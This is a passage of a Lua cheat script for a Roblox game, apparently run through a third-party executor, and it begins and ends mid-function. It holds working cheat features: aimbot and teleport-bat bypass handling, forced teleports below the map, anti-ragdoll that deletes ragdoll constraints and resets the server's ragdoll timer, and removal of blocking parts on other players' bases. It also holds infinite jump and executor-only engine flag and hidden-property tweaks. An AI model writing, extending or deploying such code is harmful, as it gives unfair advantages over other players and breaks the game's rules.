        pcall(function() M._bypassRenderConn:Disconnect() end)
        M._bypassRenderConn = nil
    end
    pcall(function() RunService:UnbindFromRenderStep("VynxBypassRotCam") end)
    M._bypassLookPos = nil

    M.bypassAimbotEnabled = false
    M.disableBypassGodmode()
    -- Restore Anti Die to whatever user had before TP Bat (if they had it on, keep on)
    if M._antiDieBeforeBat then
        M.antiDieEnabled = true
        pcall(function() if M.startAntiDie then M.startAntiDie() end end)
    else
        -- was only forced by bat → can leave protection; user asked to not die during bat only
        -- keep anti-die on if they enabled it from menu while bat was running
        if not M.antiDieEnabled then
            pcall(function() if M.stopAntiDie then M.stopAntiDie() end end)
        end
    end
    M._antiDieBeforeBat = nil
    pcall(function() M.syncCombatAntiDie() end)
    M._bypassTarget = nil
    M._bypassSwingCooldown = false
    M.bypassHitCD = false
    M._sureHitCD = false
    M._normalHitCD = false
    M._bypassHRP = nil
    M._bypassHum = nil

    local char = player.Character
    local root = char and char:FindFirstChild("HumanoidRootPart")
    if root then
        root.AssemblyLinearVelocity = Vector3.zero
        root.AssemblyAngularVelocity = Vector3.zero
    end

    local hum = char and char:FindFirstChildOfClass("Humanoid")
    if hum then
        hum.AutoRotate = (M.bypassPrevAutoRotate == nil) and true or M.bypassPrevAutoRotate
    end

    if M._autoTPWasEnabledForBypass then
        M._autoTPWasEnabledForBypass = false
        M.autoTPEnabled = true
        if M.setAutoTPVisual then M.setAutoTPVisual(true) end
        M.startAutoTP()
    end

    if M.setBypassVisual then M.setBypassVisual(false) end
    if M.mobBtnRefs.bypass then M.mobBtnRefs.bypass(false) end
end

function M.toggleBypassAimbot()
    M.bypassAimbotEnabled = not M.bypassAimbotEnabled
    if M.bypassAimbotEnabled then
        M.startBypassAimbot()
    else
        M.stopBypassAimbot()
    end
    if M.setBypassVisual then
        M.setBypassVisual(M.bypassAimbotEnabled)
    end
    if M.mobBtnRefs.bypass then
        M.mobBtnRefs.bypass(M.bypassAimbotEnabled)
    end
    saveCherryConfig()
    return M.bypassAimbotEnabled
end

-- ============================================================
-- REST OF CORE FUNCTIONS
-- ============================================================
function M.doAutoTPDown(force)
    local char = player.Character
    if not char then return end
    local hrp = char:FindFirstChild("HumanoidRootPart")
    if not hrp then return end
    local hum2 = char:FindFirstChildOfClass("Humanoid")
    if not hum2 then return end
    -- auto-TP loop only checks height/air; manual TP Down (force) always works — no cooldown
    if not force then
        if hum2.FloorMaterial ~= Enum.Material.Air then return end
        if not (hrp.Position.Y >= (tonumber(M.autoTPHeight) or 20)) then return end
    end
    local yaw = select(2, hrp.CFrame:ToEulerAnglesYXZ())
    hrp.CFrame = CFrame.new(hrp.Position.X, -7.00, hrp.Position.Z) * CFrame.Angles(0, yaw, 0)
    hrp.AssemblyLinearVelocity = Vector3.zero
    hrp.AssemblyAngularVelocity = Vector3.zero
    pcall(function() hrp.Velocity = Vector3.zero end)
    pcall(function() hrp.RotVelocity = Vector3.zero end)
end

function M.startAutoTP()
    if M.autoTPConn then task.cancel(M.autoTPConn);M.autoTPConn=nil end
    M.autoTPConn=task.spawn(function() while M.autoTPEnabled do task.wait(0.1);pcall(function() M.doAutoTPDown(false) end) end end)
end

function M.stopAutoTP() M.autoTPEnabled=false;if M.autoTPConn then task.cancel(M.autoTPConn);M.autoTPConn=nil end end

function M.runTPFloor()
    -- instant TP down, no cooldown / no debounce
    pcall(function() M.doAutoTPDown(true) end)
end


-- ============================================================
-- MIRROR TP DOWN (when enemy drops while aimbot/bat TP on)
-- ============================================================
M.mirrorTPPreviousY = M.mirrorTPPreviousY or {}
M.mirrorTPLastTeleport = M.mirrorTPLastTeleport or 0
M.MIRROR_TP_DROP_THRESHOLD = M.MIRROR_TP_DROP_THRESHOLD or 3
M.MIRROR_TP_DOWN_Y = M.MIRROR_TP_DOWN_Y or -7.00

function M.mirrorTPAimbotActive()
    -- Mirror TP Down ONLY with Bat Aimbot (not TP Bat)
    return (M.autoBatEnabled == true)
end

function M.mirrorTPTeleportDown()
    local character = player.Character
    local root = character and character:FindFirstChild("HumanoidRootPart")
    local humanoid = character and character:FindFirstChildOfClass("Humanoid")
    if not root or not humanoid or humanoid.Health <= 0 then return end
    local now = tick()
    if now - (M.mirrorTPLastTeleport or 0) < 0.08 then return end
    M.mirrorTPLastTeleport = now
    local _, yaw = root.CFrame:ToEulerAnglesYXZ()
    local y = tonumber(M.MIRROR_TP_DOWN_Y) or -7.00
    root.CFrame = CFrame.new(root.Position.X, y, root.Position.Z) * CFrame.Angles(0, yaw, 0)
    pcall(function() root.Velocity = Vector3.zero end)
    pcall(function() root.AssemblyLinearVelocity = Vector3.zero end)
    pcall(function() root.AssemblyAngularVelocity = Vector3.zero end)
end

if not M._mirrorTPStarted then
    M._mirrorTPStarted = true
    RunService.Heartbeat:Connect(function()
        if true then -- Mirror TP removed
            if next(M.mirrorTPPreviousY) then
                table.clear(M.mirrorTPPreviousY)
            end
            return
        end
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr ~= player and plr.Character then
                local root = plr.Character:FindFirstChild("HumanoidRootPart")
                if root then
                    local currentY = root.Position.Y
                    local previousY = M.mirrorTPPreviousY[plr.UserId]
                    if previousY and previousY - currentY >= (M.MIRROR_TP_DROP_THRESHOLD or 3) then
                        pcall(M.mirrorTPTeleportDown)
                        table.clear(M.mirrorTPPreviousY)
                        return
                    end
                    M.mirrorTPPreviousY[plr.UserId] = currentY
                end
            end
        end
    end)
end

function M.setMirrorTPDown(enabled)
    M.mirrorTPDownEnabled = false -- removed
    if not M.mirrorTPDownEnabled then table.clear(M.mirrorTPPreviousY) end
    if M.setMirrorTPVisual then pcall(function() M.setMirrorTPVisual(M.mirrorTPDownEnabled) end) end
    pcall(saveCherryConfig)
end

function M.setPerfectHit(enabled)
    M.perfectHitEnabled = enabled == true
    M.tpBatSureHitEnabled = M.perfectHitEnabled
    if M.perfectHitEnabled then
        M.tpBatHitMode = "Sure"
    else
        M.tpBatHitMode = "Normal"
    end
    if M.setPerfectHitVisual then pcall(function() M.setPerfectHitVisual(M.perfectHitEnabled) end) end
    if M.setTpBatModeUI then
        pcall(function()
            M.setTpBatModeUI(M.perfectHitEnabled and "Sure Hit" or "Normal Hit")
        end)
    end
    pcall(saveCherryConfig)
end



function M.enableStretchRez()
    M.stretchRezEnabled = true
    if M.stretchRezConn then pcall(function() M.stretchRezConn:Disconnect() end); M.stretchRezConn = nil end
    pcall(function() RunService:UnbindFromRenderStep("Movee_Stretch") end)
    -- Wide View: stretch aspect + FOV boost (Pulse-style)
    pcall(function()
        RunService:BindToRenderStep("Movee_Stretch", Enum.RenderPriority.Last.Value - 1, function()
            local cam = workspace.CurrentCamera
            if not cam then return end
            cam.CFrame = cam.CFrame * CFrame.new(0, 0, 0, 1, 0, 0, 0, 0.8, 0, 0, 0, 1)
            if not M._fovLockedByUser then
                cam.FieldOfView = tonumber(M.wideViewFOV) or 120
            end
        end)
    end)
end

function M.disableStretchRez()
    M.stretchRezEnabled = false
    if M.stretchRezConn then pcall(function() M.stretchRezConn:Disconnect() end); M.stretchRezConn = nil end
    pcall(function() RunService:UnbindFromRenderStep("Movee_Stretch") end)
end

M.wideViewFOV = 120

--------------------------------------------------------------------------------
-- ANTI SUMMER BASE (ONLY remove blocking Anchor parts — never wipe bases)
--------------------------------------------------------------------------------
function M.isSummerBaseName(name)
    if not name then return false end
    local n = tostring(name):lower()
    -- strict: only explicit summer base names (not beach/palm/prop — those kill enemy bases)
    return n == "summerbase"
        or n == "summer_base"
        or n:find("summerbase", 1, true) ~= nil
        or n:find("summer_base", 1, true) ~= nil
end

function M.isAnchorName(name)
    if not name then return false end
    local n = tostring(name):lower()
    return n == "anchor" or n == "anchors"
end

function M.stripBlockingAnchor(obj)
    if not obj or not obj.Parent then return end
    local key = tostring(obj:GetFullName())
    if M._antiSummerCleaned[key] then return end
    M._antiSummerCleaned[key] = true
    pcall(function()
        if obj:IsA("BasePart") or obj:IsA("MeshPart") then
            obj.CanCollide = false
            obj.CanQuery = false
            obj.CanTouch = false
            obj.Transparency = 1
        end
        obj:Destroy()
    end)
end

function M.cleanSummerBaseAnchors()
    if not M.antiSummerBaseEnabled then return end
    local plots = workspace:FindFirstChild("Plots")
    if not plots then return end

    -- Only scan Plots (not whole workspace — was causing lag + wiping bases)
    for _, plot in ipairs(plots:GetChildren()) do
        local isSummer = M.isSummerBaseName(plot.Name)
        if not isSummer then
            for _, d in ipairs(plot:GetDescendants()) do
                if M.isSummerBaseName(d.Name) then
                    isSummer = true
                    break
                end
            end
        end
        if not isSummer then continue end
        -- ONLY strip objects literally named Anchor / Anchors
        for _, d in ipairs(plot:GetDescendants()) do
            if M.isAnchorName(d.Name) then
                M.stripBlockingAnchor(d)
            end
        end
    end
end


-- ============================================================
-- HARD HIT (range ring like VOID.CC)
-- ============================================================
M._hardHitRing = nil
M._hardHitConn = nil

function M.hideHardHitRing()
    if M._hardHitRing then
        pcall(function() M._hardHitRing:Destroy() end)
        M._hardHitRing = nil
    end
end

function M.showHardHitRing()
    local char = player.Character
    if not char then return end
    local hrp = char:FindFirstChild("HumanoidRootPart")
    if not hrp then return end
    if M._hardHitRing and M._hardHitRing.Parent then return end
    local cyl = Instance.new("CylinderHandleAdornment")
    cyl.Name = "VynxHardHitRing"
    cyl.Adornee = hrp
    cyl.Color3 = Color3.fromRGB(0, 0, 0)
    cyl.AlwaysOnTop = true
    cyl.ZIndex = 5
    cyl.Transparency = 0.1
    local r = tonumber(M.hardHitRadius) or 10
    cyl.Radius = r
    cyl.InnerRadius = math.max(0.1, r - 0.35)
    cyl.Height = 0.15
    cyl.CFrame = CFrame.new(0, -3, 0)
    cyl.Parent = hrp
    M._hardHitRing = cyl
end

function M.startHardHit()
    M.hardHitEnabled = true
    if M._hardHitConn then return end
    M._hardHitConn = RunService.Heartbeat:Connect(function()
        if not M.hardHitEnabled then return end
        local char = player.Character
        if not char then return end
        local root = char:FindFirstChild("HumanoidRootPart")
        if not root then return end
        if not M._hardHitRing or not M._hardHitRing.Parent then
            M.showHardHitRing()
        end
        if M._hardHitRing then
            local r = tonumber(M.hardHitRadius) or 10
            M._hardHitRing.Radius = r
            M._hardHitRing.InnerRadius = math.max(0.1, r - 0.35)
            if M._hardHitRing.Adornee ~= root then
                M._hardHitRing.Adornee = root
                M._hardHitRing.Parent = root
            end
        end
    end)
    M.showHardHitRing()
end

function M.stopHardHit()
    M.hardHitEnabled = false
    if M._hardHitConn then
        pcall(function() M._hardHitConn:Disconnect() end)
        M._hardHitConn = nil
    end
    M.hideHardHitRing()
end

function M.enableAntiSummerBase()
    M.antiSummerBaseEnabled = true
    M._antiSummerCleaned = {}
    M.cleanSummerBaseAnchors()
    if M.antiSummerBaseConn then
        pcall(function() M.antiSummerBaseConn:Disconnect() end)
        M.antiSummerBaseConn = nil
    end
    M.antiSummerBaseConn = workspace.DescendantAdded:Connect(function(obj)
        if not M.antiSummerBaseEnabled then return end
        if not M.isAnchorName(obj.Name) then return end
        task.defer(function()
            if not M.antiSummerBaseEnabled or not obj.Parent then return end
            -- only if under Plots and near a summer-named container
            local p = obj
            local underPlots, nearSummer = false, false
            while p and p ~= workspace do
                if p.Name == "Plots" or (p.Parent and p.Parent.Name == "Plots") then underPlots = true end
                if M.isSummerBaseName(p.Name) then nearSummer = true end
                p = p.Parent
            end
            if underPlots and nearSummer then
                M.stripBlockingAnchor(obj)
            end
        end)
    end)
    task.spawn(function()
        while M.antiSummerBaseEnabled do
            M.cleanSummerBaseAnchors()
            task.wait(5) -- slower scan = less lag
        end
    end)
end

function M.disableAntiSummerBase()
    M.antiSummerBaseEnabled = false
    if M.antiSummerBaseConn then
        pcall(function() M.antiSummerBaseConn:Disconnect() end)
        M.antiSummerBaseConn = nil
    end
end

function M._isUnderPlots(obj)
    local p = obj
    while p and p ~= workspace do
        if p.Name == "Plots" then return true end
        p = p.Parent
    end
    return false
end

function M._isPlayerCharacterPart(obj)
    if not obj then return false end
    local p = obj
    while p and p ~= workspace do
        if p:IsA("Model") then
            local hum = p:FindFirstChildOfClass("Humanoid")
            if hum then return true end
            -- R15/R6 character models always have HumanoidRootPart
            if p:FindFirstChild("HumanoidRootPart") then return true end
        end
        p = p.Parent
    end
    return false
end

function M.applyAntiLagDerender(obj)
    if not obj then return end
    -- NEVER touch Plots (bases) or any player character (enemies must stay visible)
    if M._isUnderPlots(obj) then return end
    if M._isPlayerCharacterPart(obj) then return end
    pcall(function()
        if obj:IsA("Accessory") or obj:IsA("Hat") then
            return
        elseif obj:IsA("ParticleEmitter") or obj:IsA("Trail") or obj:IsA("Beam")
            or obj:IsA("Fire") or obj:IsA("Smoke") or obj:IsA("Sparkles") then
            obj.Enabled = false
        elseif obj:IsA("BasePart") or obj:IsA("MeshPart") then
            obj.CastShadow = false
            if obj.Reflectance and obj.Reflectance > 0 then
                obj.Reflectance = 0
            end
        end
    end)
end


M.optimizerEnabled = false
M._optimizerSaved = nil
function M.applyOptimizer(on)
    on = on == true
    M.optimizerEnabled = on
    if on then
        if not M._optimizerSaved then
            M._optimizerSaved = {
                ClockTime = Lighting.ClockTime, Brightness = Lighting.Brightness,
                Ambient = Lighting.Ambient, OutdoorAmbient = Lighting.OutdoorAmbient,
                FogStart = Lighting.FogStart, FogEnd = Lighting.FogEnd,
                FogColor = Lighting.FogColor, GlobalShadows = Lighting.GlobalShadows,
                ExposureCompensation = Lighting.ExposureCompensation,
            }
        end
        for _, child in ipairs(Lighting:GetChildren()) do
            if child:IsA("BlurEffect") or child:IsA("SunRaysEffect") or child:IsA("BloomEffect")
                or child:IsA("ColorCorrectionEffect") or child:IsA("DepthOfFieldEffect")
                or child:IsA("Atmosphere") or child:IsA("Sky") then
                pcall(function() child:Destroy() end)
            end
        end
        local terrain = workspace:FindFirstChildOfClass("Terrain")
        if terrain then
            for _, c in ipairs(terrain:GetChildren()) do
                if c:IsA("Clouds") then pcall(function() c:Destroy() end) end
            end
        end
        Lighting.ClockTime = 12.5
        Lighting.Brightness = 2.6
        Lighting.Ambient = Color3.fromRGB(210, 195, 140)
        Lighting.OutdoorAmbient = Color3.fromRGB(230, 210, 150)
        Lighting.FogStart = 0
        Lighting.FogEnd = 100000
        Lighting.FogColor = Color3.fromRGB(255, 230, 160)
        Lighting.GlobalShadows = false
        pcall(function() Lighting.ExposureCompensation = 0.15 end)
        local sky = Instance.new("Sky"); sky.Name = "VynxOptimizerSky"; sky.StarCount = 0
        sky.SunAngularSize = 16; sky.MoonAngularSize = 0; sky.CelestialBodiesShown = true; sky.Parent = Lighting
        local atm = Instance.new("Atmosphere"); atm.Name = "VynxOptimizerAtm"
        atm.Density = 0.22; atm.Color = Color3.fromRGB(255, 220, 150); atm.Decay = Color3.fromRGB(255, 190, 100)
        atm.Glare = 0.35; atm.Haze = 0.5; atm.Parent = Lighting
        pcall(function() if settings and settings().Rendering then settings().Rendering.QualityLevel = Enum.QualityLevel.Level05 end end)
        pcall(function() if typeof(setfpscap) == "function" then setfpscap(240) end end)
        M.antiLagEnabled = true
        pcall(function() if M.enableAntiLag then M.enableAntiLag() end end)
    else
        for _, child in ipairs(Lighting:GetChildren()) do
            if child.Name == "VynxOptimizerSky" or child.Name == "VynxOptimizerAtm" then pcall(function() child:Destroy() end) end
        end
        local s = M._optimizerSaved
        if s then
            pcall(function()
                Lighting.ClockTime = s.ClockTime; Lighting.Brightness = s.Brightness
                Lighting.Ambient = s.Ambient; Lighting.OutdoorAmbient = s.OutdoorAmbient
                Lighting.FogStart = s.FogStart; Lighting.FogEnd = s.FogEnd
                Lighting.FogColor = s.FogColor; Lighting.GlobalShadows = s.GlobalShadows
                Lighting.ExposureCompensation = s.ExposureCompensation
            end)
        end
        M.cleanSkyEnabled = true
pcall(function() M.applyCleanSky(true) end)
if M.optimizerEnabled then pcall(function() M.applyOptimizer(true) end) end
    end
end


-- ============================================================
-- FPS BOOST (from FRHUB)
-- ============================================================
M.fpsBoostEnabled = false
M._fpsBoostDescConn = nil

function M.applyFPSBoost()
    pcall(function()
        if typeof(setfpscap) == "function" then setfpscap(999999999) end
    end)
    pcall(function()
        local flags = {
            ["DFIntTaskSchedulerTargetFps"] = "999",
            ["DFIntTaskSchedulerTargetFpsMax"] = "999",
            ["FFlagDebugGraphicsPreferVulkan"] = "true",
            ["FFlagDisablePostFx"] = "true",
            ["FIntRenderShadowIntensity"] = "0",
            ["DFIntParticleMaxCount"] = "0",
            ["DFIntGlobalPointLightMaxCount"] = "0",
        }
        if typeof(setfflag) == "function" then
            for flag, val in pairs(flags) do
                pcall(function() setfflag(flag, val) end)
            end
        end
    end)
    pcall(function()
        if settings and settings().Rendering then
            settings().Rendering.QualityLevel = Enum.QualityLevel.Level01
        end
    end)
    local function isCharPart(v)
        if M._isPlayerCharacterPart then return M._isPlayerCharacterPart(v) end
        local p = v
        while p and p ~= workspace do
            if p:IsA("Model") and (p:FindFirstChildOfClass("Humanoid") or p:FindFirstChild("HumanoidRootPart")) then
                return true
            end
            p = p.Parent
        end
        return false
    end
    local function processObj(v)
        if not v then return end
        -- CRITICAL: never touch enemies / any player character (was making them disappear)
        if isCharPart(v) then return end
        if M._isUnderPlots and M._isUnderPlots(v) then return end
        pcall(function()
            if v:IsA("Model") then
                -- do not disable LOD on models that might be characters (already skipped)
                pcall(function() v.LevelOfDetail = Enum.ModelLevelOfDetail.Disabled end)
            elseif v:IsA("MeshPart") then
                v.CastShadow = false
                pcall(function() v.RenderFidelity = Enum.RenderFidelity.Performance end)
            elseif v:IsA("BasePart") then
                v.CastShadow = false
                v.Reflectance = 0
            elseif v:IsA("Fire") or v:IsA("SpotLight") or v:IsA("Smoke") or v:IsA("Sparkles")
                or v:IsA("ParticleEmitter") or v:IsA("Trail") or v:IsA("Beam") then
                v.Enabled = false
            end
            -- Do NOT wipe Decals/Textures/SpecialMesh — was turning enemies invisible
        end)
    end
    for _, v in pairs(workspace:GetDescendants()) do
        processObj(v)
    end
    pcall(function()
        local li = game:GetService("Lighting")
        for _, v in pairs(li:GetDescendants()) do
            pcall(function()
                if v:IsA("Sky") or v:IsA("Atmosphere") or v:IsA("BloomEffect") or v:IsA("BlurEffect")
                    or v:IsA("SunRaysEffect") or v:IsA("DepthOfFieldEffect") or v:IsA("Clouds")
                    or v:IsA("PostEffect") or v:IsA("ColorCorrectionEffect") then
                    v:Destroy()
                end
            end)
        end
        pcall(function()
            if sethiddenproperty then
                sethiddenproperty(li, "Technology", Enum.Technology.Legacy)
            end
        end)
        li.GlobalShadows = false
        li.FogEnd = 9e9
        li.Brightness = 0
        local t = workspace:FindFirstChildOfClass("Terrain")
        if t then
            pcall(function()
                if sethiddenproperty then sethiddenproperty(t, "Decoration", false) end
            end)
            t.WaterReflectance = 0
            t.WaterTransparency = 0.7
            t.WaterWaveSize = 0
            t.WaterWaveSpeed = 0
        end
    end)
    if M._fpsBoostDescConn then
        pcall(function() M._fpsBoostDescConn:Disconnect() end)
        M._fpsBoostDescConn = nil
    end
    M._fpsBoostDescConn = workspace.DescendantAdded:Connect(function(v)
        if M.fpsBoostEnabled then
            if isCharPart(v) then return end
            task.spawn(processObj, v)
        end
    end)
end

function M.setFpsBoost(on)
    M.fpsBoostEnabled = on == true
    if M.fpsBoostEnabled then
        M.applyFPSBoost()
    else
        if M._fpsBoostDescConn then
            pcall(function() M._fpsBoostDescConn:Disconnect() end)
            M._fpsBoostDescConn = nil
        end
    end
    if M.setFpsBoostVisual then pcall(function() M.setFpsBoostVisual(M.fpsBoostEnabled) end) end
    pcall(function() if saveCherryConfig then saveCherryConfig() end end)
end



-- Restore enemy visibility if any optimizer ever hid them
function M.ensureEnemyVisibility()
    for _, plr in ipairs(Players:GetPlayers()) do
        if plr ~= player then
            local char = plr.Character
            if char then
                pcall(function()
                    for _, d in ipairs(char:GetDescendants()) do
                        if d:IsA("BasePart") or d:IsA("MeshPart") then
                            if d.Name ~= "HumanoidRootPart" and d.Transparency >= 0.99 then
                                if d.Name == "Head" or d.Name == "Torso" or d.Name == "UpperTorso"
                                    or d.Name == "LowerTorso" or d.Name:find("Arm") or d.Name:find("Leg")
                                    or d.Name:find("Hand") or d.Name:find("Foot") then
                                    d.Transparency = 0
                                end
                            end
                            pcall(function() d.LocalTransparencyModifier = 0 end)
                        elseif d:IsA("Decal") and (d.Name == "face" or d.Name == "Face") then
                            if d.Transparency >= 1 then d.Transparency = 0 end
                        end
                    end
                end)
                if M.playerESPEnabled and M.addESP then
                    if not M.espList or not M.espList[plr] then
                        pcall(function() M.addESP(plr) end)
                    end
                end
            end
        end
    end
end

function M.enableAntiLag()
    M.removeAccessoriesEnabled = true
    M.antiLagEnabled = true
    M.defLightBrightness = M.defLightBrightness or Lighting.Brightness
    M.defLightClock = M.defLightClock or Lighting.ClockTime
    M.defLightAmbient = M.defLightAmbient or Lighting.OutdoorAmbient
    Lighting.GlobalShadows = false
    Lighting.FogEnd = 1e10
    Lighting.Brightness = 1
    Lighting.EnvironmentDiffuseScale = 0
    Lighting.EnvironmentSpecularScale = 0
    for _, e in pairs(Lighting:GetChildren()) do
        pcall(function()
            if e:IsA("BlurEffect") or e:IsA("SunRaysEffect") or e:IsA("ColorCorrectionEffect")
                or e:IsA("BloomEffect") or e:IsA("DepthOfFieldEffect") then
                e.Enabled = false
            end
        end)
    end
    -- NEVER process player characters (enemies must stay fully visible)
    if M.antiLagDescConn then M.antiLagDescConn:Disconnect() end
    M.antiLagDescConn = workspace.DescendantAdded:Connect(function(obj)
        if not M.antiLagEnabled then return end
        if M._isUnderPlots(obj) then return end
        if M._isPlayerCharacterPart and M._isPlayerCharacterPart(obj) then return end
        M.applyAntiLagDerender(obj)
    end)
end

function M.disableAntiLag()
    -- Nuke optimizer ALWAYS ON — cannot be turned off
    M.antiLagEnabled = true
    pcall(function() M.enableAntiLag() end)
    return
end

-- ============================================================
-- POTATO GRAPHICS (ported & adapted from Jade.VS)
-- Aggressive low-end performance mode. Skips Plots/bases.
-- ============================================================
M.potatoGraphicsEnabled = false
M.potatoConn = nil
M.setPotatoVisual = nil

local function _potatoIsCharPart(obj)
    for _, plr in ipairs(Players:GetPlayers()) do
        if plr.Character and obj:IsDescendantOf(plr.Character) then
            return true
        end
    end
    return false
end

local function _potatoApply(obj)
    if not obj or M._isUnderPlots(obj) then return end
    if _potatoIsCharPart(obj) then return end
    pcall(function()
        if obj:IsA("ParticleEmitter") or obj:IsA("Trail") or obj:IsA("Beam")
            or obj:IsA("Smoke") or obj:IsA("Fire") or obj:IsA("Sparkles") then
            obj.Enabled = false
        elseif obj:IsA("PointLight") or obj:IsA("SpotLight") or obj:IsA("SurfaceLight") then
            obj.Enabled = false
        elseif obj:IsA("BasePart") or obj:IsA("MeshPart") then
            obj.Material = Enum.Material.Plastic
            obj.Reflectance = 0
            obj.CastShadow = false
            pcall(function() obj.MaterialVariant = "" end)
        elseif obj:IsA("Decal") or obj:IsA("Texture") then
            -- leave map textures so bases stay readable
        end
    end)
end

function M.enablePotatoGraphics()
    M.potatoGraphicsEnabled = true
    pcall(function()
        Lighting.GlobalShadows = false
        Lighting.FogEnd = 1e10
        Lighting.Brightness = 0.5
        Lighting.EnvironmentDiffuseScale = 0
        Lighting.EnvironmentSpecularScale = 0
        pcall(function() Lighting.ExposureCompensation = 0 end)
        for _, e in ipairs(Lighting:GetChildren()) do
            if e:IsA("PostEffect") or e:IsA("BlurEffect") or e:IsA("SunRaysEffect")
                or e:IsA("ColorCorrectionEffect") or e:IsA("BloomEffect")
                or e:IsA("DepthOfFieldEffect") then
                e.Enabled = false
            end
        end
        -- Replace sky with minimal blank
        for _, o in ipairs(Lighting:GetChildren()) do
            if o:IsA("Sky") and o.Name ~= "_VynxPotato" then
                pcall(function() o:Destroy() end)
            end
        end
        local existing = Lighting:FindFirstChild("_VynxPotato")
        if not existing then
            local sky = Instance.new("Sky")
            sky.Name = "_VynxPotato"
            sky.CelestialBodiesShown = false
            sky.StarCount = 0
            sky.Parent = Lighting
        end
        local terrain = workspace:FindFirstChildOfClass("Terrain")
        if terrain then
            terrain.Decoration = false
            terrain.WaterWaveSize = 0
            terrain.WaterWaveSpeed = 0
            terrain.WaterReflectance = 0
        end
    end)
    for _, obj in ipairs(workspace:GetDescendants()) do
        _potatoApply(obj)
    end
    if M.potatoConn then pcall(function() M.potatoConn:Disconnect() end) end
    M.potatoConn = workspace.DescendantAdded:Connect(function(obj)
        if M.potatoGraphicsEnabled then
            _potatoApply(obj)
        end
    end)
end

function M.disablePotatoGraphics()
    M.potatoGraphicsEnabled = false
    if M.potatoConn then
        pcall(function() M.potatoConn:Disconnect() end)
        M.potatoConn = nil
    end
    pcall(function()
        local s = Lighting:FindFirstChild("_VynxPotato")
        if s then s:Destroy() end
    end)
    -- Note: materials/particles are not restored (one-way optim). Rejoin to fully reset.
end


-- ============================================================
-- ANTI-RAGDOLL
-- ============================================================
M.antiRagdollNoSplatterCooldown = 0

function M.forceNoSplatterReset()
    local char = player.Character
    if not char then return end
    local hum = char:FindFirstChildOfClass("Humanoid")
    local root = char:FindFirstChild("HumanoidRootPart")
    if not hum or not root or hum.Health <= 0 then return end

    pcall(function()
        hum:ChangeState(Enum.HumanoidStateType.GettingUp)
        root.Velocity = Vector3.zero
        root.RotVelocity = Vector3.zero
        root.AssemblyLinearVelocity = Vector3.zero
        root.AssemblyAngularVelocity = Vector3.zero

        for _, obj in ipairs(char:GetDescendants()) do
            if obj:IsA("Motor6D") then obj.Enabled = true end
            if obj:IsA("Constraint") then obj.Enabled = true end
        end

        workspace.CurrentCamera.CameraSubject = hum

        local PM = player.PlayerScripts:FindFirstChild("PlayerModule")
        if PM then
            local CM = require(PM:FindFirstChild("ControlModule"))
            if CM then CM:Enable() end
        end

        hum.AutoRotate = true
        hum.PlatformStand = false
        hum.Sit = false
    end)
end

function M.startAntiRagdoll()
    if M.Conns.antiRag then return end
    M.Conns.antiRag = RunService.Heartbeat:Connect(function()
        if not M.antiRagdollEnabled then return end
        local char = player.Character
        if not char then return end
        local hum = char:FindFirstChildOfClass("Humanoid")
        local root = char:FindFirstChild("HumanoidRootPart")
        if not hum or hum.Health <= 0 then return end

        local state = hum:GetState()
        local ragdolled = (state == Enum.HumanoidStateType.Physics or
                          state == Enum.HumanoidStateType.Ragdoll or
                          state == Enum.HumanoidStateType.FallingDown)

        if M.antiRagdollMode == "No Splatter" then
            if ragdolled then
                local now = tick()
                if now - (M.antiRagdollNoSplatterCooldown or 0) > 0.15 then
                    M.antiRagdollNoSplatterCooldown = now
                    M.forceNoSplatterReset()
                end
            end
            return
        end

        if not root then return end
        local endTime = player:GetAttribute("RagdollEndTime")
        if endTime and (endTime - workspace:GetServerTimeNow()) > 0 then
            ragdolled = true
        end
        if ragdolled then
            pcall(function()
                player:SetAttribute("RagdollEndTime", workspace:GetServerTimeNow())
            end)
            for _, d in ipairs(char:GetDescendants()) do
                if d:IsA("BallSocketConstraint") or
                   (d:IsA("Attachment") and d.Name:find("RagdollAttachment")) then
                    d:Destroy()
                end
            end
            for _, obj in ipairs(char:GetDescendants()) do
                if obj:IsA("Motor6D") and obj.Enabled == false then
                    obj.Enabled = true
                end
            end
            if hum.Health > 0 then
                hum:ChangeState(Enum.HumanoidStateType.Running)
            end
            workspace.CurrentCamera.CameraSubject = hum
            root.Anchored = false
            root.AssemblyLinearVelocity = Vector3.zero
            root.AssemblyAngularVelocity = Vector3.zero
        end
    end)
end

function M.stopAntiRagdoll()
    if M.Conns.antiRag then
        M.Conns.antiRag:Disconnect()
        M.Conns.antiRag = nil
    end
end

-- ============================================================
-- INFINITE JUMP (BodyVelocity, anti-TPBack / anti-kick safe)
-- ============================================================
M.jumpHeld = false
M.infJumpThread = nil
M._infJumpBoosting = false
M._infJumpLastBoost = 0
M.INF_JUMP_BOOST_FORCE = 25
M.INF_JUMP_BOOST_FRAMES = 2
M.INF_JUMP_BOOST_COOLDOWN = 0.12

local function M_applyInfJumpBoost(root)
    if not root or M._infJumpBoosting then return end
    local now = tick()
    if now - M._infJumpLastBoost < M.INF_JUMP_BOOST_COOLDOWN then return end
    M._infJumpLastBoost = now
    M._infJumpBoosting = true

    local bv = Instance.new("BodyVelocity")
    bv.MaxForce = Vector3.new(0, math.huge, 0)
    bv.P = 1250
    bv.Velocity = Vector3.new(root.Velocity.X, M.INF_JUMP_BOOST_FORCE, root.Velocity.Z)
    bv.Parent = root

    local frameCount = 0
    local conn
    conn = RunService.Heartbeat:Connect(function()
        if frameCount < M.INF_JUMP_BOOST_FRAMES then
            frameCount = frameCount + 1
            if bv and bv.Parent then
                bv.Velocity = bv.Velocity + Vector3.new(0, 0.01, 0)
            end
        else
            if bv then pcall(function() bv:Destroy() end) end
            if conn then conn:Disconnect() end
            M._infJumpBoosting = false
        end
    end)
end

task.spawn(function()
    local pg = player:WaitForChild("PlayerGui", 10)
    if pg then
        local function hookJumpButton(btn)
            if btn:IsA("GuiButton") and btn.Name == "JumpButton" and not btn:GetAttribute("InfJumpHooked") then
                btn:SetAttribute("InfJumpHooked", true)
                btn.MouseButton1Down:Connect(function()
                    if M.infJumpEnabled then
                        M.jumpHeld = true
                    end
                end)
                btn.MouseButton1Up:Connect(function() M.jumpHeld = false end)
                btn.MouseLeave:Connect(function() M.jumpHeld = false end)
            end
        end
        for _, d in ipairs(pg:GetDescendants()) do hookJumpButton(d) end
        pg.DescendantAdded:Connect(hookJumpButton)
    end
end)

UIS.JumpRequest:Connect(function()
    if M.infJumpEnabled and M.infJumpMode == "manual" then
        M.jumpHeld = true
        task.delay(0.08, function() M.jumpHeld = false end)
    end
end)

UIS.InputBegan:Connect(function(inp, gpe)
    if gpe then return end
    if M.infJumpEnabled
        and inp.UserInputType == Enum.UserInputType.Keyboard
